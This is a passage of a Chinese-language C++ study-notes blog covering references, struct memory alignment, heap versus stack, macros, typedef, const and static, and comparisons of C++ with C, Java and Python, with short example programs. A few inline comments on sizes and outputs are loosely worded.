testREFF(a);</span><br><span class="line">	cout&lt;&lt;a;//12</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>引用变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void ss(int &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">  a=7;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"> 	int b=5;</span><br><span class="line">    std::cout&lt;&lt;&amp;b&lt;&lt;&quot;,&quot;&lt;&lt;b&lt;&lt;std::endl;</span><br><span class="line">    ss(b);</span><br><span class="line">    std::cout&lt;&lt;&amp;b&lt;&lt;&quot;,&quot;&lt;&lt;b;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>0x72fdec,5<br>0x72fdec,7</p>
</blockquote>
<h3 id="引用作为函数返回类型"><a href="#引用作为函数返回类型" class="headerlink" title="引用作为函数返回类型"></a>引用作为函数返回类型</h3><p><code>int&amp; jisuan(int x)&#123;&#125;</code></p>
<blockquote>
<ol>
<li><strong>避免复制：</strong> 使用引用作为返回类型可以避免在函数调用时进行数据的复制操作。当返回引用时，实际上是将调用方的变量和函数内部的对象绑定在一起，而不是创建一个新的副本。这可以提高程序的性能，尤其是当返回的对象很大时。</li>
<li><strong>允许修改：</strong> 返回引用使调用方能够修改原始对象。这在需要从函数内部修改调用方的变量时非常有用，特别是在函数内部修改一个对象而不需要使用指针的情况下。</li>
<li><strong>链式调用：</strong> 使用引用作为返回类型，可以实现链式调用。这在某些情况下可以使代码更加清晰和简洁。例如，很多标准库的操作就采用了链式调用的方式。</li>
<li><strong>传递信息：</strong> 引用作为返回类型可以传递更多的信息，如返回一个布尔值来指示函数执行的成功与否。这种情况下，函数可以直接修改调用方提供的变量来传递额外的信息。</li>
</ol>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="type">int</span>  a=<span class="number">4</span>;</span><br><span class="line"> <span class="number">2</span> <span class="function"><span class="type">int</span>  &amp;<span class="title">f</span><span class="params">(<span class="type">int</span>  x)</span></span></span><br><span class="line"><span class="function"> 3 </span>&#123;</span><br><span class="line"> <span class="number">4</span>     a = a + x;</span><br><span class="line"> <span class="number">5</span>     <span class="keyword">return</span>  a;</span><br><span class="line"> <span class="number">6</span> &#125;</span><br><span class="line"> <span class="number">7</span> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> 8 </span>&#123;</span><br><span class="line"> <span class="number">9</span>     <span class="type">int</span> t = <span class="number">5</span>;</span><br><span class="line"><span class="number">10</span>     cout&lt;&lt;<span class="built_in">f</span>(t)&lt;&lt;endl;  <span class="comment">//a = 9</span></span><br><span class="line"><span class="number">11</span>     <span class="built_in">f</span>(t) = <span class="number">20</span>;           <span class="comment">//a = 20</span></span><br><span class="line"><span class="number">12</span>     cout&lt;&lt;<span class="built_in">f</span>(t)&lt;&lt;endl;  <span class="comment">//t = 5,a = 25</span></span><br><span class="line"><span class="number">13</span>     t = <span class="built_in">f</span>(t);            <span class="comment">//a = 30 t = 30</span></span><br><span class="line"><span class="number">14</span>     cout&lt;&lt;<span class="built_in">f</span>(t)&lt;&lt;endl;  <span class="comment">//t = 60</span></span><br><span class="line"><span class="number">15</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">16</span> &#125;</span><br></pre></td></tr></table></figure>



<h2 id="结构体为什么要内存对齐"><a href="#结构体为什么要内存对齐" class="headerlink" title="结构体为什么要内存对齐"></a>结构体为什么要内存对齐</h2><p>平台原因，有的平台只能在某些地址处取特定类型的数据，否则抛出硬件异常</p>
<p>硬件原因，内存对齐之后，cpu内存访问速度大大提升</p>
<p>1、 分配内存的顺序是按照声明的顺序。</p>
<p>2、 每个变量<strong>相对于起始位置的偏移量</strong>必须是<strong>该变量类型大小的整数倍</strong>，不是整数倍，则空出内存，直到偏移量是整数倍为止</p>
<p> 3、 最后整个结构体的大小必须是里面变量类型最大值的整数倍</p>
<p>添加了#pragma pack(n)后规则就变成了下面这样： </p>
<p>1、 偏移量要是n和当前变量大小中较小值的整数倍</p>
<p> 2、 整体大小要是n和最大变量大小中较小值的整数倍</p>
<p> 3、 n值必须为1,2,4,8…，为其他值时就按照默认的分配规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Test&#123;</span><br><span class="line">	int a;//4</span><br><span class="line">	char b;//1</span><br><span class="line">	int c;//4    总共会是9字节吗</span><br><span class="line">&#125;test;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	test.a=1;</span><br><span class="line">	test.b=2;</span><br><span class="line">	test.c=3;</span><br><span class="line">	cout&lt;&lt;sizeof(test)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实是12字节</p>
<p>以0x0000为起始地址，32位操作系统讨论</p>
<table>
<thead>
<tr>
<th>0x01</th>
<th>0x00</th>
<th>0x00</th>
<th>0x00</th>
</tr>
</thead>
<tbody><tr>
<td>变量a</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>还空了三字节</p>
<table>
<thead>
<tr>
<th>0x02</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>变量b</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>0x03</th>
<th>0x00</th>
<th>0x00</th>
<th>0x00</th>
</tr>
</thead>
<tbody><tr>
<td>变量c</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>对于变量b，c，如果无内存对齐情况，这是5字节</p>
<p>前4字节</p>
<table>
<thead>
<tr>
<th>0x02</th>
<th>0x03</th>
<th>0x00</th>
<th>0x00</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>后1字节</p>
<table>
<thead>
<tr>
<th>0x00</th>
</tr>
</thead>
</table>
<p>这样的话，要读取两次，再拼接；而内存对齐，一次读取即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">double a;//4</span><br><span class="line">char b;//1</span><br><span class="line">   double d;//8   总共的sizeof是24(8+8+8)</span><br><span class="line">   </span><br><span class="line">   int a;//4</span><br><span class="line">char b;//1</span><br><span class="line">int c;//4   </span><br><span class="line">   double d;//8 //总共是24 (4+4+4+8)=20</span><br><span class="line">   </span><br><span class="line"> </span><br><span class="line">  cout&lt;&lt;offsetof(Test,a)&lt;&lt;endl;//0</span><br><span class="line">   cout&lt;&lt;offsetof(Test,b)&lt;&lt;endl;//4</span><br><span class="line">   cout&lt;&lt;offsetof(Test,c)&lt;&lt;endl;//8</span><br><span class="line">   cout&lt;&lt;offsetof(Test,d)&lt;&lt;endl;//16</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   int a;//4</span><br><span class="line">char b;//1  </span><br><span class="line">   double d;//8  //总共是16 (4+4+8)</span><br><span class="line">   </span><br><span class="line">   综上，所以类型大小小的那个，本身所占的空间取决于其上一个类型</span><br><span class="line">   </span><br><span class="line">   int a;//4</span><br><span class="line">   double d;//8</span><br><span class="line">char b;//1   //总共是24   那就是说本来是4+8+8为20，因为要满足最大类型的整数倍，那就24咯？</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> cout&lt;&lt;offsetof(Test,a)&lt;&lt;endl;//0</span><br><span class="line">   cout&lt;&lt;offsetof(Test,d)&lt;&lt;endl;//8</span><br><span class="line">   cout&lt;&lt;offsetof(Test,b)&lt;&lt;endl;//16</span><br></pre></td></tr></table></figure>



<h2 id="传递函数参数，什么时候用指针、引用"><a href="#传递函数参数，什么时候用指针、引用" class="headerlink" title="传递函数参数，什么时候用指针、引用"></a>传递函数参数，什么时候用指针、引用</h2><p>指针：</p>
<blockquote>
<ul>
<li>返回函数内局部变量的内存时。使用指针传参需要开辟内存，用完释放，否则引起内存泄露。而返回局部变量的引用无意义</li>
</ul>
</blockquote>
<p>引用</p>
<blockquote>
<ul>
<li>对栈空间大小比较敏感(比如递归)时用引用，引用传递不需要创建临时变量，开销更小</li>
<li>类对象作为参数传递要用引用</li>
</ul>
</blockquote>
<h2 id="堆和栈区别"><a href="#堆和栈区别" class="headerlink" title="堆和栈区别"></a>堆和栈区别</h2><p>申请方式</p>
<blockquote>
<ul>
<li>栈由系统自动分配</li>
<li>堆是自己申请、释放</li>
</ul>
</blockquote>
<p>申请大小限制</p>
<blockquote>
<p>栈顶和栈底是之前预设好的，栈是向栈底扩展，大小固定</p>
<p>堆向高地址扩展，是不连续的内存区域，大小灵活调整(这是由于系统是用链表来存储的空闲内存地址的，自然是不连续的，链表的遍历方向是由低地址向高地址)</p>
</blockquote>
<p>申请效率</p>
<blockquote>
<p>栈由系统分配，速度快，无碎片 (先进后出，进出一一对应)</p>
<p>堆有程序员分配，速度慢，有碎片</p>
</blockquote>
<p>分配方式和空间大小</p>
<blockquote>
<p>堆，动态分配，不连续</p>
<p>栈，动态、静态都有，连续内存区域</p>
</blockquote>
<p>栈空间默认4M，堆区一般1G-4G</p>
<p>栈就像点菜，申请、使用，快捷，但自由度小</p>
<p>堆，自己做菜，麻烦，自由度大</p>
<h2 id="宏定义和函数区别"><a href="#宏定义和函数区别" class="headerlink" title="宏定义和函数区别"></a>宏定义和函数区别</h2><p>1.执行速度</p>
<blockquote>
<p>宏在编译时完成替换，被替换的文本参与编译，相当于直接插入了代码；运行时不存在函数调用，执行更快；</p>
<p>而调用函数，需要跳转到具体调用函数</p>
</blockquote>
<p>2.返回值</p>
<blockquote>
<p>宏定义相当于在结构中插入代码，无返回值；</p>
<p>函数调用是有的</p>
</blockquote>
<p>3.类型检查</p>
<blockquote>
<p>宏定义无类型，不进行类型检查</p>
<p>函数要</p>
</blockquote>
<p>4.宏定义，不是语句，最后不加分号</p>
<h3 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h3><p>1.预处理阶段：当编译c++代码时，预处理器过一遍c++所以#开头的语句，预编译器将这些代码评估完后给到编译器进行实际的编译</p>
<p>2.用宏的目的：将代码中的文本替换为其它东西</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WAIT std::cin.get()</span></span><br><span class="line"><span class="comment">//可以不放分号，否则会加入宏了</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WAIT;</span><br><span class="line">	<span class="comment">//等价于std::cin.get()</span></span><br><span class="line">	<span class="comment">//当然，这种操作很蠢，只能让自己读懂代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.用法1：<code>发送参数</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">#define log(x) std::cout&lt;&lt;x&lt;&lt;std::endl</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    log(&quot;hello&quot;);//输出hello</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用法2：<code>辅助调试</code></p>
<p>debug模式下会有很多日志的输出，Release模式下就不需要日志的输出了，正常的方法会删除	很多输出日志的语句或函数。 <strong>宏可以直接取消掉这样的语句</strong></p>
<p>利用<code>#if,#else,endif</code>实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">#define PR_DEBUG 1 </span><br><span class="line">#if PR_DEBUG==1</span><br><span class="line">#define log(x) std::cout&lt;&lt;x&lt;&lt;std::endl </span><br><span class="line">#else</span><br><span class="line">#define log(x) //什么也不定义 无意义</span><br><span class="line">#endif</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">   </span><br><span class="line">    log(&quot;hello&quot;);//当PR_DEBUG 为 1，输出，为0，无输出</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用<code>#if 0</code>和<code>#endif</code>删除一段宏</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">#if 0</span><br><span class="line"></span><br><span class="line">#define PR_DEBUG 1 </span><br><span class="line">#if PR_DEBUG==1</span><br><span class="line">#define log(x) std::cout&lt;&lt;x&lt;&lt;std::endl </span><br><span class="line">#else</span><br><span class="line">#define log(x) //什么也不定义 无意义</span><br><span class="line">#endif</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">#endif</span><br><span class="line">int main()&#123;</span><br><span class="line">   </span><br><span class="line">    log(&quot;hello&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">//输出 error: &#x27;log&#x27; was not declared in this scope</span><br></pre></td></tr></table></figure>



<h2 id="宏和模板的区别"><a href="#宏和模板的区别" class="headerlink" title="宏和模板的区别"></a>宏和模板的区别</h2><p>发生时间不同，宏在预处理阶段就被评估了</p>
<h2 id="宏和typedef区别"><a href="#宏和typedef区别" class="headerlink" title="宏和typedef区别"></a>宏和typedef区别</h2><p>1.用途</p>
<blockquote>
<p>宏主要用于定义常量和书写复杂的内容</p>
<p>typede定义类型f<strong>别名</strong></p>
</blockquote>
<p>2.时间</p>
<blockquote>
<p>宏替换发生在编译阶段之前，文本插入替换</p>
<p>typedef是编译的一部分</p>
</blockquote>
<p>3.宏不检查类型，typedef检查数据类型</p>
<p>4.宏不是语句，末尾不加分号；typedef要</p>
<p>5.指针的操作不同 ，typedef char * p_char和#define p_char char *区别巨大。</p>
<h2 id="变量声明和定义区别？"><a href="#变量声明和定义区别？" class="headerlink" title="变量声明和定义区别？"></a>变量声明和定义区别？</h2><ul>
<li>声明仅仅把变量的声明的<strong>位置及类型</strong>提供给编译器，不分配内存空间</li>
</ul>
<p>定义，要在定义的地方为其分配存储空间</p>
<ul>
<li>相同变量多处声明（外部变量<strong>extern</strong>） ，但只能在一处定义</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//变量声明</span><br><span class="line">extern int x;</span><br><span class="line">//变量定义</span><br><span class="line">int x;</span><br><span class="line">int y=10;</span><br></pre></td></tr></table></figure>

<p>总之，变量声明通知编译器变量的存在和类型，而变量定义创建变量，为其分配内存，</p>
<p>总结：</p>
<p>声明就是告知一下，你知道有这么个变量或者函数，这个变量的具体值，还有这个函数的函数体，不用知道；就告诉<strong>基本信息</strong>，<strong>需要extern关键字</strong></p>
<p>定义就是，变量的初始化啊，函数体的<strong>具体实现</strong>啊</p>
<p>如果是在类中的话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line">    Person(); // 成员函数的声明</span><br><span class="line">    void SetName(const std::string&amp; name); // 成员函数的声明</span><br><span class="line">    void SetAge(int age); // 成员函数的声明</span><br><span class="line">    void PrintInfo() const; // 成员函数的声明</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">    std::string name_; // 成员变量的声明</span><br><span class="line">    int age_; // 成员变量的声明</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Person::Person() : age_(0) &#123;</span><br><span class="line">    // 构造函数的定义</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Person::SetName(const std::string&amp; name) &#123;</span><br><span class="line">    name_ = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Person::SetAge(int age) &#123;</span><br><span class="line">    age_ = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Person::PrintInfo() const &#123;</span><br><span class="line">    std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name_ &lt;&lt; &quot;, Age: &quot; &lt;&lt; age_ &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="strlen和sizeof区别"><a href="#strlen和sizeof区别" class="headerlink" title="strlen和sizeof区别"></a>strlen和sizeof区别</h2><p>sizeof运算符，结果在编译时得到，所以不能得到运行时分配的存储空间大小；strlen是库函数</p>
<p>sizeof参数可以是任何数据的类型或数据；strlen的参数只能是字符指针且结尾是’\0’的字符串</p>
<h2 id="a与-amp-a的区别"><a href="#a与-amp-a的区别" class="headerlink" title="a与&amp;a的区别"></a>a与&amp;a的区别</h2><p>假设数组int a[10] 与int(*p)[10]&#x3D;&amp;a</p>
<p>a是数组名，是数组首元素地址，*(a+1)&#x3D;a[1]，a相当于&amp;a[0]</p>
<p>&amp;a是数组的指针，其类型为int(*p)[10]，值就是地址了，如果+1，其实是整个数组的偏移，地址为尾元素的后一个元素地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">   </span><br><span class="line">    int a[4]=&#123;1,2,3,4&#125;;</span><br><span class="line">    int (*p)[4]=&amp;a;</span><br><span class="line">   </span><br><span class="line">    std::cout&lt;&lt;a&lt;&lt;&quot;,&quot;&lt;&lt;&amp;a&lt;&lt;std::endl;//0x72fdf0,0x72fdf0</span><br><span class="line">   </span><br><span class="line">    std::cout&lt;&lt;*a&lt;&lt;&quot;,&quot;&lt;&lt;*&amp;a[0]&lt;&lt;std::endl;//1,1</span><br><span class="line"></span><br><span class="line">    std::cout&lt;&lt;*(a+1)&lt;&lt;&quot;,&quot;&lt;&lt;*(&amp;a[1])&lt;&lt;std::endl;//2,2</span><br><span class="line">	//也就是说(&amp;a+1)，其实是整个数组的偏移，地址为尾元素的后一个元素地址</span><br><span class="line">    std::cout&lt;&lt;(a+4)&lt;&lt;&quot;,&quot;&lt;&lt;(&amp;a+1)&lt;&lt;std::endl;//0x72fe00,0x72fe00</span><br><span class="line"></span><br><span class="line">    std::cout&lt;&lt;*(a+1)&lt;&lt;&quot;,&quot;&lt;&lt;*(*p+1)&lt;&lt;std::endl;//2,2</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="c-与python"><a href="#c-与python" class="headerlink" title="c++与python"></a>c++与python</h2><p>python是解释执行的脚本语言；c++是在特定平台运行的编译语言</p>
<p>python缩进区分代码块；c++花括号</p>
<p>python库多，调用方便，不需要事先定义变量类型，基本数据类型为数字、布尔值、字符串、列表、元组等等</p>
<h2 id="c-与c"><a href="#c-与c" class="headerlink" title="c++与c"></a>c++与c</h2><p>c没有字符串类型</p>
<p>c++的new取代了c中的malloc</p>
<p>c++的控制态输入输出iostream类替代c的stdio函数</p>
<p>c++允许重载，c不允许</p>
<p>c++允许重复定义变量，变量定义语句在使用它之前都可以；但c不能重复定义，且必须在函数开头部分</p>
<p>c++多了关键字 bool、using、namespace等等</p>
<h3 id="c的特点"><a href="#c的特点" class="headerlink" title="c的特点"></a>c的特点</h3><p>面向过程的结构化语言，易于调试和维护</p>
<p>表现能力和处理能力极强，可以直接访问内存的物理地址</p>
<p>c实现了对硬件的编程操作，也适合应用软件的开发</p>
<h3 id="c-特点"><a href="#c-特点" class="headerlink" title="c++特点"></a>c++特点</h3><p>在c的基础上扩充和完善，使c++兼容了c语言的面向过程特点，又成为了一种面向对象的程序设计语言</p>
<p>可以使用抽象数据类型进行基于对象的编程</p>
<p>可以使用多继承、多态进行面向对象的编程</p>
<p>担负起以模板为特征的泛型化编程</p>
<h2 id="c-与java"><a href="#c-与java" class="headerlink" title="c++与java"></a>c++与java</h2><h3 id="语言特性"><a href="#语言特性" class="headerlink" title="语言特性"></a>语言特性</h3><p>java完全面向对象，jvm(java虚拟机)安装到任何操作系统上，可移植性强</p>
<p>java没有指针的概念</p>
<p>java用接口取代了c++中的抽象类，省却了在实现和维护上的复杂性</p>
<h3 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h3><p>c++析构函数回收</p>
<p>java是内存的分配和回收都是自动的</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>java在web应用上相比具有优势	，有丰富的框架</p>
<p>底层程序的编程以及控制方面的编程，c++灵活，有句柄的存在</p>
<p>java在桌面程序的实用性不如c++;c++可直接编译成exe文件，指针是c++的优势，可以直接对内存操作，但有危险性</p>
<h2 id="c-的class和struct"><a href="#c-的class和struct" class="headerlink" title="c++的class和struct"></a>c++的class和struct</h2><p>相同</p>
<blockquote>
<p>都有成员函数、公有、私有部分</p>
<p>任何可以用class完成的工作，可以用struct完成</p>
</blockquote>
<p>不同点</p>
<blockquote>
<p>如果不对成员不指定公私有，struct默认公有。class默认私有</p>
<p>class默认private继承，struct默认public继承</p>
</blockquote>
<h2 id="define与const"><a href="#define与const" class="headerlink" title="define与const"></a>define与const</h2><p>编译阶段</p>
<blockquote>
<p>define编译的预处理阶段起作用</p>
<p>const在编译、运行时起作用</p>
</blockquote>
<p>安全性</p>
<blockquote>
<p>define只做替换，不做类型检查和计算，不求解</p>
<p>const常量有数据类型，编译器对其进行类型安全检查</p>
</blockquote>
<p>内存占用</p>
<blockquote>
<p>define只是将宏名称进行替换，内存中有多个相同的备份；const就一份</p>
<p>宏定义的数据没有分配内存空间，const定义的变量只是值不能改变，但要分配内存空间</p>
</blockquote>
<h2 id="const和static的作用"><a href="#const和static的作用" class="headerlink" title="const和static的作用"></a>const和static的作用</h2><h3 id="static-1"><a href="#static-1" class="headerlink" title="static"></a>static</h3><h4 id="不考虑类的情况"><a href="#不考虑类的情况" class="headerlink" title="不考虑类的情况"></a>不考虑类的情况</h4><p>1.隐藏</p>
<blockquote>
<p>不加static的全局变量和函数具有全局可见性，可在其他文件中使用，加了只能在该文件所在的编译模块中使用</p>
</blockquote>
<p>2.默认初始化为0</p>
<blockquote>
<p>包括未初始化的全局静态变量与局部静态变量</p>
</blockquote>
<p>3.静态变量在函数内定义，始终存在，且只进行一次初始化，具有记忆性</p>
<blockquote>
<p>作用范围与局部变量相同，函数退出后仍然存在，但不能使用</p>
</blockquote>
<p>应用场景：两个全局变量的名字不能一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//在a.cpp中</span><br><span class="line">//int s_var=5;//冲突了</span><br><span class="line">static int s_var=5;</span><br><span class="line">//main.cpp中</span><br><span class="line">int s_var=10;</span><br><span class="line">//或者extern int s_var;</span><br><span class="line">...</span><br><span class="line">cout&lt;&lt;s_var;// 10</span><br></pre></td></tr></table></figure>



<h4 id="考虑类"><a href="#考虑类" class="headerlink" title="考虑类"></a>考虑类</h4><p>static成员变量:</p>
<blockquote>
<p>只与类关联，不与类的对象关联，定义时要分配空间，不能在类声明中初始化</p>
<p>必须在类定义体<strong>外部</strong>初始化(为了分配内存)，初始化时不需要标识为static，可以被非static成员函数任意访问</p>
</blockquote>
<p>static成员函数:</p>
<blockquote>
<p>不具有this指针(本质上，写的所有非static方法都会获得当前类实例作为参数)</p>
<p>没有类实例</p>
<p>无法访问类对象的非static成员变量和非static成员函数；</p>
<p>不能被声明为const、虚函数和volatile；可以被非static成员函数任意访问</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">struct Entity</span><br><span class="line">&#123;</span><br><span class="line">    static int x;</span><br><span class="line"></span><br><span class="line">    void print()</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int Entity::x;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    Entity e1;</span><br><span class="line">    e1.x = 1;</span><br><span class="line"></span><br><span class="line">    Entity e2;</span><br><span class="line">    e2.x = 2;</span><br><span class="line"></span><br><span class="line">    e1.print();//2</span><br><span class="line">    e2.print();//2</span><br><span class="line"></span><br><span class="line">    cin.get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个实例化对象共享的是同一个变量，正因如此，<strong>通过类实例来引用静态变量是没有意义的</strong></p>
<p>所以可以这样写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Entity e1;</span><br><span class="line">   Entity::x = 1;</span><br><span class="line"></span><br><span class="line">   Entity e2;</span><br><span class="line">    Entity::x = 2;</span><br><span class="line"></span><br><span class="line">   e1.print();//2</span><br><span class="line">   e2.print();//2</span><br></pre></td></tr></table></figure>

<p>如果连print()也是静态的话，由于静态函数无实例，可以这样写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Entity</span><br><span class="line">&#123;</span><br><span class="line">    static int x;</span><br><span class="line"></span><br><span class="line">    static void print()</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int Entity::x;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    Entity::x = 1;</span><br><span class="line">    Entity::x= 2;</span><br><span class="line">    Entity::print();//2</span><br><span class="line">    Entity::print();//2</span><br><span class="line"></span><br><span class="line">    cin.get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然了，此时将x改为非static，会报错，因为static函数无法访问非静态变量(静态方法无实例)</p>
<p>所以，静态方法和在类外部编写的方法一样</p>
<p>如果在类外面写一个print()，访问不到x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Entity</span><br><span class="line">&#123;</span><br><span class="line">    int x;</span><br><span class="line"></span><br><span class="line">    static void print()</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; x &lt;&lt; endl;  // 报错，不能访问到非静态变量x</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">//在类外面写一个print()函数</span><br><span class="line">static void print()</span><br><span class="line">&#123;</span><br><span class="line"> cout &lt;&lt; x &lt;&lt; endl;  // 报错，x是什么？没被定义。</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    Entity e1;</span><br><span class="line">    e1.x = 1;</span><br><span class="line"></span><br><span class="line">    Entity e2;</span><br><span class="line">    e2.x = 2;</span><br><span class="line"></span><br><span class="line">    e1.print();</span><br><span class="line">    e2.print();</span><br><span class="line"></span><br><span class="line">    cin.get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面这种就可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//在类外面写一个print()函数</span><br><span class="line">static void print(Entity e)</span><br><span class="line">&#123;</span><br><span class="line"> cout &lt;&lt; e.x &lt;&lt; endl;  // 成功运行</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="const-1"><a href="#const-1" class="headerlink" title="const"></a>const</h3><ul>
<li><strong>const首先作用于左边的东西；如果左边没东西，就做用于右边的东西</strong></li>
<li>const被cherno称为伪关键字，因为它在改变生成代码方面做不了什么。</li>
<li>const是一个承诺，承诺一些东西是不变的，你是否遵守诺言取决于你自己。我们要保持const是因为这个承诺实际上可以简化很多代码。</li>
</ul>
<h4 id="不考虑类"><a href="#不考虑类" class="headerlink" title="不考虑类"></a>不考虑类</h4><p>const常量在定义时 必须初始化，之后无法更改</p>
<p>const形参可以接收const和非const类型的实参</p>
<h4 id="考虑类-1"><a href="#考虑类-1" class="headerlink" title="考虑类"></a>考虑类</h4><p>const成员变量:</p>
<blockquote>
<p>不能在类定义外部初始化，只能通过构造函数初始化列表进行初始化，并且必须有构造函数；</p>
<p>不同类对其const数据成员的值可以不同，所以不能在类中初始化</p>
</blockquote>
<p>const成员函数：</p>
<blockquote>
<p>const对象不可以调用非const成员函数;</p>
<p>非const对象都可以调用</p>
<p>不可以改变非mutable数据的值</p>
</blockquote>
<p><strong>mutable:该关键字声明的变量可以在const成员函数中被修改</strong></p>
<h2 id="顶层const和底层const"><a href="#顶层const和底层const" class="headerlink" title="顶层const和底层const"></a>顶层const和底层const</h2><p>顶层const：指的是const修饰的变量本身是一个常量，无法修改，指的是指针，就是*号的右边</p>
<p>底层const：指的是const修饰的变量所指向的对象是一个常量，指的是所指变量，就是*号的左边</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int a=10;int* const b1=&amp;a;//顶层const，b1本身是个常量</span><br><span class="line">const int* b2=&amp;a;//底层const，b2本身可变，所指对象是常量</span><br><span class="line">const int b3=20;//顶层const，b3常量不可变</span><br><span class="line">const int* const b4=&amp;a;//前一个const为底层;后一个为顶层,b4不可变</span><br><span class="line">const int&amp; b5=a;//用于声明引用变量，底层const</span><br></pre></td></tr></table></figure>

<p>区分作用：</p>
<blockquote>
<p>执行对象拷贝时有限制，常量的底层const不能赋值给非常量的底层const</p>
<p>使用命令强制类型转换函数const_cast时，只能改变运算对象的底层const</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const int a;int const a;//定义常量类型a</span><br><span class="line">const int* a;//a为指向int型变量的指针，const在*左侧，表示a指向不可变常量</span><br><span class="line">int *const a;//a指向int型变量，const在*右侧，表示常指针，即该指针初始化后，不可更改指向</span><br></pre></td></tr></table></figure>

<h2 id="数组名与指针的区别"><a href="#数组名与指针的区别" class="headerlink" title="数组名与指针的区别"></a>数组名与指针的区别</h2><blockquote>
<p>都可以通过增减偏移量来访问数组中的元素</p>
<p>数组名理解为常指针，所以数组名没有自增自减操作</p>
<p>数组名做形参传递给调用函数后，失去原有特性，退化为一般指针，可以自增、自减，但sizeof运算符不能得到原数组大小</p>
</blockquote>
